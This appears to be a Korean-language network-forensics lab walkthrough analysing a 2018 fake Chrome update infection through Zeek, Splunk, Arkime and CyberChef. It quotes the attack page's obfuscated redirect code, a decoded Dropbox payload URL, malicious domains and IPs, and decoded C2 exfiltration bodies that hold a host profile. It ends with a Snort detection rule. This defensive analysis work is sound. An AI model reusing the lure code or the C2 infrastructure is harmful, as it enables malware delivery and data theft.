1. **20:27:53 — 사용자가 교회 사이트를 열었어요.** `GET /`에 **Referer가 없어요**. 주소를 직접 쳤거나 즐겨찾기를 눌렀어요. 앞에 피싱 링크가 없어요. `/` → `/new`(301) → `/new/`(진짜 페이지) → 사이트 자체 스크립트 7개.
2. **20:27:55~56 — 교회 페이지가 낯선 서버를 불렀어요.** `track.positiverefreshment.org`의 **Referer가 `…stmarybahrain.com/new/`**예요. 교회 페이지 안의 무언가가 불렀어요. **[추측]** 사이트가 **해킹**됐어요.
3. **`s_code.js`를 세 번, URL이 갈수록 길어져요.** 세 번째에 **브라우저 지문**이 있어요: 브라우저, User-Agent 전체, `Win32`, 화면 `1920x1080`, `en-US`, 플러그인, **그래픽 카드(`NVIDIA GeForce GT 730`)**, 색상 설정. **TDS**(트래픽 분배 시스템)가 감염시킬지 정하는 거예요. 진짜 윈도우 PC → 통과, 가상 머신·샌드박스·연구자·휴대폰 → 걸러요.
4. **20:27:57 — 통과.** `lw2e.sineadhollywoodnutt.com/topics/index.php` — 이것도 Referer가 교회 페이지예요. `cid=220`(TDS)와 `b=220`(이 서버)이 **같은 번호 = 같은 캠페인**이에요. 응답은 HTML이 아니라 자바스크립트예요.
5. **20:27:58 — 위장.** 구글이 아닌 도메인의 **`/chromefiles/`** 폴더에서 글꼴과 `css.css`를 불러와요.

**IP 확인:**

```spl
index=zeek sourcetype=zeek:http pcap_case=20180630_SORTING_THROUGH_THE_ALERTS host IN ("www.stmarybahrain.com","track.positiverefreshment.org","lw2e.sineadhollywoodnutt.com","bb17eb22.login3.kimbrelelectric.com")
| stats values(id_resp_h) as server_ip by host
```

```text
host                                  server_ip
bb17eb22.login3.kimbrelelectric.com   93.95.100.138
lw2e.sineadhollywoodnutt.com          93.95.100.178
track.positiverefreshment.org         185.244.149.74
www.stmarybahrain.com                 66.226.144.232
```

**93.95.100.178**(가짜 페이지)과 **93.95.100.138**(kimbrelelectric)은 `93.95.100`이 같은 **/24 대역**이에요. 이름은 전혀 다른데 같은 서버 묶음 → **[추측]** 같은 운영자.

### 3-3. 가짜 페이지 내용 (Arkime) { #fake-page }

Zeek는 요약만 남기고 **본문은 안 남겨요**. 페이지가 무엇을 시켰는지는 본문에 있어요.

```text
tags == 20180630_SORTING_THROUGH_THE_ALERTS && host.http == lw2e.sineadhollywoodnutt.com && http.uri == *index.php*
```

세션을 펼치고(`+`) **natural** 보기와 **uncompress**를 켠 다음 **응답**을 읽어요.

```text
<title>Update Chrome</title>
<h1 id="main-title" tabindex="-1">You are using an older version of Chrome</h1>
<a class="button eula-download-button download-button ..." href="javascript:void(0)" id="buttonDownload">Update Chrome</a>

var fileUrl = getUrl('#1)=(l)d(?as8j{.)2}2,.y3v.)2(7;_(e,m;odr)h)C,/fs;n{l7i{dim,c7678,d(r99jl6vif(/0s)/lmyopcg.ex(o2b{p,ogr{dv.{w(w(wp/)/,:;s,p;t{t(h,');
setTimeout(function() { window.location.href = fileUrl; }, 3000);
document.getElementById('buttonDownload').onclick = function() { window.location.href = fileUrl; return false; };
```

**[데이터] 결과 읽기:**

- 스크립트가 **교회 페이지를 그 자리에서 바꿔 써요**(`document.head` / `document.body`). 주소창은 교회 사이트 그대로인데 화면은 **Chrome 업데이트 페이지**예요.
- **3초 뒤**(`setTimeout … 3000`) `fileUrl`로 스스로 이동해요. 버튼도 같은 곳으로 가요.
- 진짜 Chrome은 웹사이트에서 업데이트하라고 하지 않아요. **웹사이트가 브라우저 업데이트를 주면 거의 항상 가짜**예요.
- `fileUrl`은 숨겨져 있어요. 푸는 함수가 같은 응답에 있어요.

```javascript
function getUrl(url) {
    var res = '';
    for(var i=0; i<url.length; i++) {
        if(i%2===1) res += url[i];
    }
    res = res.split("").reverse().join("");
    return res;
}
```

| 줄 | 뜻 | CyberChef |
|---|---|---|
| `for (… i<url.length …)` | 글자를 하나씩 봐요 | — |
| `if(i%2===1) res += url[i]` | `i%2` = i를 2로 나눈 나머지. 1, 3, 5…번째 = **두 글자마다 두 번째** 글자만 골라요 | Find / Replace `(.)(.)` → `$2` |
| `split("").reverse().join("")` | 떼고, 뒤집고, 붙여요 | Reverse |

### 3-4. 주소 풀기 (CyberChef 또는 브라우저 콘솔) { #decode-url }

**CyberChef 레시피**

1. Input: 따옴표 **안쪽** 글자만(129글자 — Input 아래 `ABC`로 확인).
2. **Find / Replace** — Find `(.)(.)`(**REGEX**), Replace `$2`, **Global match** 켜기.
3. **Reverse** — By Character.

`(.)` = 아무 글자 하나를 1번·2번 묶음으로 기억, `$2` = 두 글자를 2번 묶음으로 바꾸기. 129는 홀수라 마지막 글자는 짝이 없어서 그대로 남고, Reverse 뒤에 **맨 앞**(`,`)에 와요. 무시해요.

!!! question "질문: 결과가 그냥 거꾸로 된 글자 / 기호투성이로 나왔어요"
    분석 중에 실제로 한 실수 두 가지예요. 둘 다 흔해요.

    - **Find와 Replace 칸이 바뀌었어요**(Find에 `$2`, Replace는 빈칸). 정규식에서 `$`는 "줄 끝"이라 `$2`는 아무것도 못 찾고, Reverse만 실행돼요.
    - **Input에 따옴표가 남아 있었어요**(`ABC`가 131). 맨 앞의 `'` 하나 때문에 짝이 한 칸씩 밀려서 0, 2, 4…번째 = 쓰레기 글자만 골라요. 자바스크립트에서 따옴표는 글자의 시작과 끝 표시일 뿐 데이터가 아니에요.

    습관: 결과가 이상하면 Input의 **앞, 끝, 글자 수**부터 확인해요.

**지름길 — 해독 함수만 브라우저 콘솔에서 실행하기**

1. **인터넷이 끊긴 VM**(VMware → Network Adapter → *Connected* 해제)에서 `about:blank`를 열어요.
2. **F12 → Console.** 처음 붙여 넣을 때 `allow pasting`을 손으로 쳐요.
3. 함수를 먼저 읽어요. 안에 `window.location`, `document.write`, `innerHTML`, `eval(`, `Function(`, `fetch(`, `XMLHttpRequest`, `new Image`, `setTimeout`이 **있으면 실행하지 마세요.** `getUrl`은 돌고, 떼고, 뒤집고, 돌려주기만 해서 안전해요. `setTimeout` / `onclick` 줄은 절대 같이 복사하지 마세요(실제로 이동해요).
4. 함수를 붙여 넣고 Enter → `undefined`(정의만 했고 아직 계산 안 함).
5. 이번에는 **따옴표를 포함해서** 호출해요(코드에서 따옴표는 글자 표시예요).

```javascript
getUrl('#1)=(l)d(?as8j{.)2}2,.y3v.)2(7;_(e,m;odr)h)C,/fs;n{l7i{dim,c7678,d(r99jl6vif(/0s)/lmyopcg.ex(o2b{p,ogr{dv.{w(w(wp/)/,:;s,p;t{t(h,')
```

```text
'https://www.dropbox.com/s/fvl9rd86cmdilns/Chrome_72.3.22.js?dl=1'
```

`copy(getUrl('…'))`는 결과를 클립보드에 넣어요. 흔한 오류: `Unexpected end of input`(마지막 `}` 빠짐), `getUrl is not defined`(함수를 안 붙였거나 대소문자 오타), `Invalid or unexpected token`(Arkime의 줄 접기 때문에 문자열 안에 줄바꿈이 들어갔거나 예쁜 따옴표).

**[데이터] 주소 읽기:**

| 부분 | 뜻 |
|---|---|
| `www.dropbox.com/s/fvl9rd86cmdilns/` | 공격자가 올린 Dropbox **공유 링크** |
| `Chrome_72.3.22.js` | 설치 파일(`.exe`)이 아니라 **자바스크립트** 파일. 윈도우에서 더블클릭하면 **Windows Script Host**(`wscript.exe`)가 브라우저 밖에서 사용자 권한으로 실행해요 |
| `?dl=1` | 미리보기 없이 바로 다운로드 |

2018년 6월에는 Chrome **72**가 없었어요(이 PC는 67). Dropbox는 믿는 도메인이고 HTTPS라 필터를 통과하고 PCAP에서 내용이 안 보여요.

!!! question "질문: 주소를 풀기도 전에 왜 갑자기 Dropbox가 나왔나요?"
    나오면 안 됐어요. 순서는 **주소 풀기 → 도메인 보기 → 그 도메인 찾기**예요. 가이드가 이 PCAP을 미리 분석해 둬서 Dropbox를 먼저 말해 버렸어요. 그때까지 분석자 데이터에 있던 것은 2-2의 Dropbox(20:27:59~20:28:00)와 20:27:57에 뜬 페이지의 `setTimeout(…, 3000)`이었어요. 시간이 맞는다는 건 **추측**이고, 풀어 낸 주소가 **증거**예요.

!!! question "질문: 도움 없이 누가 이걸 풀 수 있나요?"
    처음부터 혼자 푸는 사람은 없어요. 세 가지 습관이면 익숙해져요. (1) 숨긴 글자는 **해독기를 같이 들고 다녀요** — 글자를 감싼 함수를 찾아 읽어요. (2) 명령을 CyberChef로 옮겨요(`%2` → 글자 고르기, `reverse` → Reverse, `atob` → From Base64, `^` → XOR). (3) 함수가 단순하고 안전하면 오프라인 콘솔에서 **실행**해요. 그래도 안 풀리면 네트워크만으로(가짜 페이지 → 3초 → Dropbox) 보고서를 쓸 수 있어요. "URL obfuscated, not decoded"라고 적어요.

### 3-5. 다운로드가 실제로 일어났나 (Splunk) { #download }

HTTPS라 `http.log`에 URL이나 파일이 없어요. 암호화 전에 평문으로 보내는 서버 이름, **SNI**로 찾아요.

```spl
index=zeek sourcetype=zeek:ssl pcap_case=20180630_SORTING_THROUGH_THE_ALERTS server_name="*dropbox*"
| eval t=strftime(ts,"%H:%M:%S.%3N")
| table t id_resp_h id_resp_p server_name version established
```

```text
t              id_resp_h     id_resp_p  server_name                                              version  established
20:28:01.640   162.125.9.6   443        uc7cfbc6f640f168ed8036c6d5bb.dl.dropboxusercontent.com   TLSv12   true
20:28:00.733   162.125.6.2   443        log.getdropbox.com                                       TLSv12   true
20:28:00.427   162.125.6.1   443        www.dropbox.com                                          TLSv12   true
```

```spl
index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_THROUGH_THE_ALERTS id_orig_h=172.16.2.169 id_resp_h=162.125.9.6
| eval t=strftime(ts,"%H:%M:%S")
| table t id_resp_h id_resp_p duration orig_bytes resp_bytes conn_state
```

```text
t         id_resp_h    id_resp_p  duration   orig_bytes  resp_bytes  conn_state
20:28:01  162.125.9.6  443        180.389    1237        23469       SF
```

**[데이터] 결과 읽기:**

- 가짜 페이지 20:27:57.029 + 3초 = **20:28:00.4** = 첫 Dropbox 연결. 코드와 트래픽이 **0.4초** 안에서 맞아요. 사용자가 클릭할 필요도 없었어요.
- `www.dropbox.com` → `log.getdropbox.com`(Dropbox 페이지의 사용 기록, 정상) → `*.dl.dropboxusercontent.com`(`dl=1` 파일을 내보내는 파일 서버).
- TLS 오버헤드 포함 **약 23 KB** → 파일은 약 20 KB 이하, 스크립트 크기예요. `SF` = 전송 완료.
- **`duration` 180초는 전송 시간이 아니에요.** 브라우저는 다운로드 뒤에도 연결을 열어 두었다가(keep-alive) 한가하면 닫아요.
- 내용과 해시는 안 보여요. 호스트 담당자가 `C:\Users\lloyd.maxwell\Downloads\Chrome_72.3.22.js`를 수집해야 해요(위치는 4-5에서 확인).

그다음 **45초 동안 네트워크 단서가 없어요**(20:28:01 → 20:28:46). 다운로드를 보고, 클릭하고, 윈도우가 실행하는 데 걸리는 시간 정도예요.

---

## 4단계 — 스크립트 실행: WScript C2 { #wscript }

**목적:** 내려받은 파일은 실행되기 전까지 감염이 아니에요. **실행 증거**와 무엇을 주고받았는지 찾아요.

### 4-1. POST 3개 (Splunk) { #posts }

```spl
index=zeek sourcetype=zeek:http pcap_case=20180630_SORTING_THROUGH_THE_ALERTS host="bb17eb22.login3.kimbrelelectric.com"
| eval t=strftime(ts,"%H:%M:%S.%3N")
| table t uid id_orig_p id_resp_h method uri status_code user_agent request_body_len response_body_len resp_mime_types
```

- `uid` = Zeek가 **TCP 연결 하나**마다 붙이는 ID. 같은 `uid` = 같은 연결. `request_body_len` = PC가 본문으로 보낸 바이트, `response_body_len` = 돌려받은 바이트.

```text
t              uid                 id_orig_p  id_resp_h      method  uri         status  request_body_len  response_body_len  resp_mime_types
20:28:47.389   CwVJZs2YKLpHSE8LQ1  49440      93.95.100.138  POST    /blank.gif  200     72                11866              text/plain
20:28:48.186   CwVJZs2YKLpHSE8LQ1  49440      93.95.100.138  POST    /blank.gif  200     2644              348868             text/plain
20:28:50.047   CwVJZs2YKLpHSE8LQ1  49440      93.95.100.138  POST    /blank.gif  200     256               0
```

**[데이터] 결과 읽기:**

- **연결 하나, 3초, POST 3개** — 사람이 아니라 정해진 순서를 따르는 프로그램이에요.
- **`/blank.gif`로 POST** — GIF는 내려받는 파일이지 데이터를 보내는 곳이 아니에요. 로그를 훑는 사람을 속이는 이름이에요.
- 보낸 크기: 작게(72) → 크게(2,644) → 작게(256). 받은 크기: 중간(11.9 KB) → **아주 큼(349 KB)** → 없음. 무언가가 **전달**됐어요.

### 4-2. 바로 앞의 DNS { #c2-dns }

```spl
index=zeek sourcetype=zeek:dns pcap_case=20180630_SORTING_THROUGH_THE_ALERTS query="*kimbrelelectric.com"
| eval t=strftime(ts,"%H:%M:%S.%3N")
| table t id_resp_h query answers
```

```text
t              id_resp_h   query                                 answers
20:28:46.573   172.16.2.9  bb17eb22.login3.kimbrelelectric.com   93.95.100.138
```

첫 POST 0.8초 전이에요. 가짜 페이지와 같은 /24 대역이에요.

### 4-3. 돌려받은 것 (Splunk) { #c2-files }

Zeek는 HTTP 본문을 모두 파일로 보고 해시를 구해요.

```spl
index=zeek sourcetype=zeek:files pcap_case=20180630_SORTING_THROUGH_THE_ALERTS tx_hosts="93.95.100.138"
| eval t=strftime(ts,"%H:%M:%S.%3N")
| table t tx_hosts rx_hosts mime_type seen_bytes md5
```

- `tx_hosts` = 보낸 쪽, `rx_hosts` = 받은 쪽, `mime_type` = **내용으로** 판단한 형식.

```text
t              tx_hosts       rx_hosts      mime_type   seen_bytes  md5
20:28:48.503   93.95.100.138  172.16.2.169  text/plain  348868      dd83bbcc7dd4184b352f9882c3fe8408
20:28:47.666   93.95.100.138  172.16.2.169  text/plain  11866       0e8a4bb8758c4ca91a3ee52395617ef9
```

**[데이터] 결과 읽기:** 두 응답 모두 `text/plain`이고, Arkime에서 보면 **`0-9a-f`만** 길게 이어져요 — **hex 글자**예요. 바이트 하나를 두 글자로 쓰니까 349 KB 글자 = **약 174 KB 데이터**예요. EXE를 hex 글자로 보내면 `MZ`도 `application/x-dosexec`도 없어서 "EXE 다운로드" 검색에 안 걸려요. **이 MD5는 hex 글자의 해시**이지 디스크 파일의 해시가 아니에요.

### 4-4. 요청 헤더 (Arkime) { #headers }

```text
tags == 20180630_SORTING_THROUGH_THE_ALERTS && host.http == bb17eb22.login3.kimbrelelectric.com
```

```text
POST /blank.gif HTTP/1.1
Accept: */*
Accept-Language: en-us
Age: 464b8967d47e14d7
Content-Type: application/x-www-form-urlencoded
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; .NET CLR 2.0.50727; SLCC2; ...)
Host: bb17eb22.login3.kimbrelelectric.com
Content-Length: 72
Connection: Keep-Alive
Cache-Control: no-cache

a=075d6d603e653c386b3969687b6c60686d6a7b6f606c686e6d6e646d686f6b646e6a7b
```

**[데이터] 결과 읽기:**

- **`Age:`는 요청에 있으면 안 돼요.** 캐시 서버가 **응답에** 붙이는 헤더이고 값은 초 단위 숫자예요. 여기서는 PC가 16진수 16글자를 보내고, 모든 POST에서 같아요 → **[추측]** 헤더로 보내는 피해자 ID.
- `UA-CPU: AMD64`는 64비트 윈도우의 스크립트용 HTTP 객체가 붙여요. `MSIE 7.0`과 함께 → **브라우저가 아니라 윈도우 스크립트**.
- `Content-Type: application/x-www-form-urlencoded` = 폼 데이터, `이름=값` 모양. 이게 해독의 열쇠예요(다음).

### 4-5. POST 본문 풀기 (CyberChef) { #decode-posts }

이번에는 해독 함수가 없어요. PC 안의 `.js`에 있거든요. 그래서 **생김새를 읽어요**.

1. `a=` 뒤가 `0-9a-f`뿐, 짝수 길이 → **hex**. From Hex → 알아볼 수 없는 바이트 → **한 겹 더**.
2. 가장 흔한 단순한 겹은 **1바이트 XOR**이에요(키 256개뿐). 맞는 키는 **crib**(원래 글에 꼭 있을 글자)으로 골라요. 폼 데이터(`이름=값&…`)이고 바깥 이름이 한 글자(`a=`, `b=`)라서 **`&1=`**을 써 봐요.

**레시피**(본문마다 따로, `a=`, `b=`, `c=` **뒤의** hex만 복사):

1. **From Hex**
2. **XOR Brute Force** — Key length `1`, Crib `&1=`. 읽을 수 있는 줄의 키를 적어요.
3. **XOR**로 바꿔요 — 그 키, **HEX**.
4. **URL Decode**(`%5C` → `\`, `%3A` → `:`, `%7C` → `|`).

!!! note "글자 수"
    Zeek의 `request_body_len`에는 `a=` 두 글자가 포함돼요. 그래서 hex 부분은 `a=` **70**글자, `b=` **2,642**글자, `c=` **254**글자예요. Input 아래 `ABC`로 확인하세요. `b=`는 Arkime에서 여러 줄로 접혀 있어서 끝을 놓치기 쉬워요.

**`a=` — 키 `5d`**

```text
Z␀0=c8ae6d45&1=507&2=1530390526937&
```

앞의 한두 바이트는 쓰레기(키 정보로 보여요) — 무시해요. `0=c8ae6d45`는 ID 같고, `1=507`은 캠페인/빌드 번호 같아요(`b=`, `c=`에도 나와요). `2=`는 **13자리 = epoch 밀리초**예요. CyberChef **From UNIX Timestamp**(Units: Milliseconds) 또는 Splunk:

```spl
| makeresults
| eval t=strftime(1530390526937/1000, "%Y-%m-%d %H:%M:%S.%3N")
| table t
```

`| makeresults`는 계산용 빈 줄 하나를 만들어요. 결과 **20:28:46.937 UTC** — 스크립트가 자기 시계로 적은 시간이에요. DNS(46.573)와 POST(47.389) 사이예요. 이 메시지는 **그 순간 그 PC에서** 만들어졌어요.

**`b=` — 키 `db`, 그다음 URL Decode**

```text
0=507
1=C:\Users\lloyd.maxwell\Downloads\Chrome_72.3.22.js
2=AMD64
3=CONSERVATOR-PC
4=lloyd.maxwell
5=6
6=Windows_NT
7=FABULOUSDUKES
8=System manufacturer|
9=System Product Name|
10=031913 - 20130319;System Serial Number|
11=Windows Defender|
12=
13=90:E2:BA:2D:C6:D6|
14=Enhanced (101- or 102-key)|Enhanced (101- or 102-key)|
15=USB Input Device|
16=1024x768|
17=System Idle Process|System|smss.exe|...|explorer.exe|...|nvvsvc.exe|nvxdsync.exe|...|chrome.exe (x23)|wscript.exe|mscorsvw.exe|...|WmiPrvSE.exe|
18=2596
19=
20=1530390528027
```

| 번호 | 뜻 |
|---|---|
| **1** | **스크립트가 실행된 곳: Downloads 폴더.** Dropbox 파일이 **실행됐어요** — 3-5를 확인해 줘요 |
| 3, 4, 7 | 호스트, 사용자, **도메인** — 회사 PC, 가치 있는 목표 |
| 8–10 | 기본값 그대로인 BIOS 문자열(조립 PC에서 흔함) |
| 11 | **백신: 윈도우 기본 Defender만** |
| 13–16 | 네트워크 카드, 키보드, 마우스, 화면 — "진짜 사람 PC인가?" |
| **17** | **프로세스 목록:** `wscript.exe`(스크립트 엔진 — `MSIE 7.0`의 정체), `chrome.exe` 23개, NVIDIA 프로세스(TDS 지문의 그래픽 카드와 맞음), **분석 도구 없음** |
| 20 | 20:28:48.027 UTC, POST 0.16초 전 |

**[추측]** 공격자는 이걸로 다음 단계를 보낼 가치가 있는지 판단해요. 도메인 가입, 진짜 하드웨어, 기본 백신만 → 통과 → 바로 **349 KB** 응답이 왔어요.

!!! question "질문: `c=`는 어디 있나요?"
    같은 Arkime 세션의 세 번째 POST예요. Arkime는 기본으로 **처음 200개 패킷**만 보여 주는데, 이 세션은 299 + 296개예요. `c=`는 349 KB 응답 **뒤**에 있어서 안 보였어요. **`200 packets`**를 더 큰 값으로 바꾸거나, **`Dst`**를 꺼서 PC 쪽만 보거나, Ctrl+F로 `Content-Length: 256`을 찾아요. Arkime에서 있어야 할 게 안 보이면 세션의 패킷 수와 표시 제한부터 비교해요.

    `c=`가 있다는 걸 어떻게 알았을까요? 분석자 데이터에서: 4-1에 **256바이트** 본문의 세 번째 POST가 있었어요. 이름이 `c=`라는 건 `a=`, `b=`를 보고 한 추측이었고, 이 PCAP을 미리 분석해서 알고 있기도 했어요 — 그 점을 먼저 말했어야 했어요.

**`c=` — 키 `c8`, 그다음 URL Decode**

```text
0=507&1=C:\Users\LLOYD~1.MAX\AppData\Local\Temp\Chrome_72.3.22.exe&2=0&3=0&4=1&5=0&6=0&7=0&8=0&9=1530390529896&
```

- **[데이터]** 같은 이름의 **`.exe`**가 사용자의 **`%TEMP%`**에 있어요. `LLOYD~1.MAX`는 `lloyd.maxwell`의 8.3 짧은 이름이에요(`%TEMP%`를 펼치면 자주 이렇게 나와요). `9=` = 20:28:49.896 UTC. `2=`–`8=`은 상태 표시값 같지만 뜻은 몰라요.
- **[추측]** 스크립트가 349 KB 응답을 풀어서 `Chrome_72.3.22.exe`로 저장하고 실행한 뒤 경로를 보고했어요. 실행은 네트워크 증거가 필요해요 → 5단계.

!!! question "질문: 어떤 글자에 어떤 해독을 쓰는지 규칙이 있나요?"
    네, 대부분 **쓰인 글자의 종류**가 알려 줘요. `0-9a-f`, 짝수 길이 → From Hex. `A-Z a-z 0-9 + /`에 끝이 `=` → From Base64. `%xx` → URL Decode(보통 **마지막** 겹). `\x41` → Unescape string, `\u0041` → Unescape Unicode Characters, 쉼표로 나뉜 10진수 → From Charcode. `TVqQ`(Base64) / `4d5a`(hex)로 시작 → EXE, `H4sI` / `1f8b` → gzip. 풀었는데 알아볼 수 없고 Entropy가 낮거나 중간 → 1바이트 XOR. **Crib**은 **그 겹에서** 꼭 있을 글자예요: 폼 데이터는 `&1=`, 주소는 `http`, 체크인은 베이스라이닝에서 찾은 호스트·사용자 이름, EXE는 `This program`. XOR 다음에 URL 인코딩이 있으면 경로 crib은 `C:\`가 아니라 `C%3A%5C`예요.

---

## 5단계 — 페이로드 다음: 베이스라인 후보 1, 2로 돌아가기 { #followon }

**왜 이 단계인가:** `c=`는 EXE를 **저장**했다고 했어요. 저장과 실행은 달라요. **[추측]** 새로 실행된 악성코드는 거의 항상 **자기 C2**에 먼저 연락해요. 그래서 질문은 *20:28:50 이후에 새로 시작한 외부 통신이 있나?*가 돼요. 답은 이미 메모에 있었어요. 2-2에서 20:28:46 뒤에 수상한 새 도메인은 없었고, 2-3에서 DNS 없는 IP가 딱 두 곳 나왔어요. 베이스라이닝 때는 설명할 수 없었던 것을, 이제 새로 안 사실로 시험해요.

쿼리로 보려는 것:

| 질문 | 방법 |
|---|---|
| EXE 직후에 시작했나? | 첫 `ts`와 `c=`(20:28:49.9) 비교 |
| 프로그램인가, 사람인가? | `delta` — 일정한 박자 |
| 연결이 성공했나? | `conn_state`, `history`, 패킷 수 |

```spl
index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_THROUGH_THE_ALERTS id_resp_h IN ("46.105.131.66","107.170.231.118")
| sort ts
| delta ts as gap
| eval t=strftime(ts,"%H:%M:%S.%3N"), gap=round(gap,1)
| table t id_orig_p id_resp_h id_resp_p conn_state history orig_pkts resp_pkts gap
```

- `sort ts`를 먼저 해요 — `delta`는 줄 순서대로 계산해요. `delta ts as gap` = 바로 위 줄과의 시간 차이(초).
- `history` = Zeek가 본 TCP 신호. **대문자는 PC, 소문자는 서버**: `S/s` SYN, `h` SYN-ACK, `R/r` RST, `D/d` 데이터. `Sr` = "PC가 요청, 서버가 거절", `S` = "PC가 요청, 대답 없음".

```text
t              id_orig_p  id_resp_h         id_resp_p  conn_state  history  orig_pkts  resp_pkts  gap
20:29:00.525   49447      46.105.131.66     443        REJ         Sr       1          1
20:29:01.159   49447      46.105.131.66     443        REJ         Sr       1          1          0.6
20:29:01.795   49447      46.105.131.66     443        REJ         Sr       1          1          0.6
20:29:01.931   49448      46.105.131.66     443        REJ         Sr       1          1          0.1
20:29:02.560   49448      46.105.131.66     443        REJ         Sr       1          1          0.6
20:29:03.200   49448      46.105.131.66     443        REJ         Sr       1          1          0.6
20:31:14.351   49471      107.170.231.118   4143       S0          S        2          0          131.2
20:31:23.351   49471      107.170.231.118   4143       S0          S        1          0          9.0
20:31:35.352   49472      107.170.231.118   4143       S0          S        2          0          12.0
20:31:44.349   49472      107.170.231.118   4143       S0          S        1          0          9.0
20:36:10.366   49491      46.105.131.66     443        REJ         Sr       1          1          266.0
...            (같은 모양 반복)
20:59:06.815   49514      46.105.131.66     443        REJ         Sr       1          1          0.6
```

**[데이터] 결과 읽기:**

- **첫 시도 20:29:00.525 — `c=` 약 10초 뒤.**
- **46.105.131.66:443 — `Sr`, 양쪽 패킷 1개씩.** 서버는 켜져 있는데 443에서 듣는 프로그램이 없어서 거절해요. 윈도우는 거절당하면 0.6초 간격으로 두 번 더 시도하고, 새 포트로 다시 해요 → **회차마다 6줄**. Zeek는 RST로 연결을 닫아서 재시도마다 새 줄을 만들어요. 6 × 5회차 = 2-3의 **30**.
- **107.170.231.118:4143 — `S`, 대답 전혀 없음.** 서버가 꺼졌거나 중간에서 패킷이 버려졌어요. 윈도우는 SYN을 간격을 늘리며(약 3초, 약 6초) 다시 보내고 약 9초 뒤 포기한 다음 새 포트로 해요. Zeek가 쉬는 시간 때문에 포트 하나를 두 줄로 나눠서 4줄 × 4회차 = **16**.
- Arkime도 같아요: `SYN 1  SYN-ACK 0  RST 1`, Databytes 0.

**회차:**

| 46.105.131.66 | 약 2분 뒤 | 107.170.231.118 |
|---|---|---|
| 20:29:00 | → | 20:31:14 |
| 20:36:10 | → | 20:38:30 |
| 20:43:37 | → | 20:45:53 |
| 20:51:14 | → | 20:53:21 |
| 20:59:04 | (캡처 끝) | |

두 IP가 **번갈아** 나와요. IP 1 → 약 2분 → IP 2 → 약 5분 → 반복, 한 바퀴 약 7.5분, 캡처 끝까지. **[추측]** 프로그램 안의 C2 목록을 차례로 시도하고 회차 사이에 쉬는 모습이에요.

**결론:**

- **[데이터]** EXE 보고 10초 뒤부터 하드코딩된 IP 두 곳에 일정한 박자로 접속을 시도했고, **한 번도 연결되지 않았어요**. 네트워크에 C2 명령, 추가 다운로드, 유출이 없어요.
- **[추측]** `%TEMP%\Chrome_72.3.22.exe`가 **실행됐고** C2를 시도했어요. 가짜 업데이트 감염 뒤 443과 이상한 높은 포트의 하드코딩된 IP:포트 C2는 2018년 **Dridex**의 모습과 같아요. 해시나 시그니처가 없으니 보고서에는 "consistent with Dridex (unconfirmed)"라고 써요.
- C2가 죽어 있는 건 오늘만 PC를 지켜 줘요. 호스트는 감염됐어요. 정리하고, 사용자 비밀번호는 노출된 것으로 봐요.

---

## 6단계 — 간단한 Snort 룰 하나 { #snort }

| 후보 | 장점 | 단점 |
|---|---|---|
| **C2 도메인 `kimbrelelectric.com`** | 실행이 확인된 통신, 평문 HTTP | 도메인이 바뀔 수 있음 |
| `/chromefiles/` | 감염 전 단계를 잡음 | 다른 사이트도 쓸 수 있음 |
| C2 IP 두 곳 | 실패한 C2를 잡음 | 내용 없음, IP는 쉽게 바뀜 |

```text
alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:"SocGholish C2 kimbrelelectric.com - Sung"; content:"kimbrelelectric.com"; nocase; sid:1000041; rev:1;)
```

- `$HOME_NET any -> $EXTERNAL_NET 80` — 내부에서 외부 80번 포트로. `content` + `nocase` — 패킷 어디든 이 글자, 대소문자 무시(POST마다 `Host:` 헤더에 있어요). `sid` 1000000 이상 = 직접 만든 룰. 만든 것 같은 하위 이름(`bb17eb22.login3.`)은 피해자마다 바뀔 수 있어서 일부러 뺐어요.

룰을 **한 줄로** `\\10.50.10.60\rules\local.rules`에 넣고 pcapbox에서:

```bash
sudo snort -T -c /etc/snort/snort.conf 2>&1 | tail -5
snort-test 20180630_SORTING_THROUGH_THE_ALERTS
```

```text
[1/2] 문법 OK
[2/2] /data/pcap/20180630_SORTING_THROUGH_THE_ALERTS.pcap
  개수 [gid:sid:rev] 메시지
      3 [1:1000041:1] SocGholish C2 kimbrelelectric.com - Sung
```

**경보 3개** = POST 3개. DNS 질의에도 이름이 있지만 DNS는 UDP이고 룰은 TCP예요.

!!! warning "`sudo pcap-ingest: command not found` — 그리고 다시 넣지 마세요"
    Oracle Linux에서 `sudo`는 `secure_path`만 찾고, 거기엔 `/usr/local/bin`이 없어요. 필요하면 전체 경로(`sudo /usr/local/bin/pcap-ingest …`)로 실행해요. 하지만 케이스를 다시 넣으면 **Zeek와 Arkime까지** 다시 돌아서 Splunk와 Arkime에 로그가 **두 번** 들어가고 이 페이지의 숫자가 두 배가 될 수 있어요. 룰 시험은 `snort-test`면 충분해요.

---

## 타임라인 (2018-06-30, UTC) { #timeline }

| 시각 | 이벤트 |
|---|---|
| 20:27:15 | 캡처 시작 |
| 20:27:17–18 | CONSERVATOR-PC와 **lloyd.maxwell** 로그온(Kerberos) |
| 20:27:52 | `www.cnn.com` 열림(잡음 — 광고가 따라옴) |
| 20:27:53 | `www.stmarybahrain[.]com` 열림, Referer 없음 — **해킹된 사이트** |
| 20:27:55–56 | `track.positiverefreshment[.]org/s_code.js` 3번 — 지문 검사, TDS 통과 |
| 20:27:57 | `lw2e.sineadhollywoodnutt[.]com`의 가짜 **"Update Chrome"** 페이지 |
| 20:28:00–01 | 3초 타이머 → Dropbox → `Chrome_72.3.22.js`(약 20 KB, HTTPS) |
| 20:28:46 | DNS `bb17eb22.login3.kimbrelelectric[.]com` — **사용자가 .js 실행** |
| 20:28:47 | POST `a=` — 체크인 |
| 20:28:48 | POST `b=` — PC 프로필, 응답 **349 KB** hex 페이로드 |
| 20:28:50 | POST `c=` — `%TEMP%\Chrome_72.3.22.exe` 보고 |
| 20:29:00 | 첫 C2 시도 46.105.131.66:443(거절) |
| 20:31:14 | 첫 C2 시도 107.170.231.118:4143(대답 없음) |
| 20:29–20:59 | 약 7.5분마다 번갈아 시도 — 연결 안 됨 |
| 20:33–20:35 | BITS로 Chrome 구성 요소 업데이트(정상) |
| 20:59:06 | 캡처 끝 |

---

## 복사해서 쓰는 쿼리 { #query-sheet }

`<case>`는 케이스 이름으로 바꿔요.

**Splunk (Zeek)**

```spl
index=zeek sourcetype=zeek:conn | stats count by pcap_case
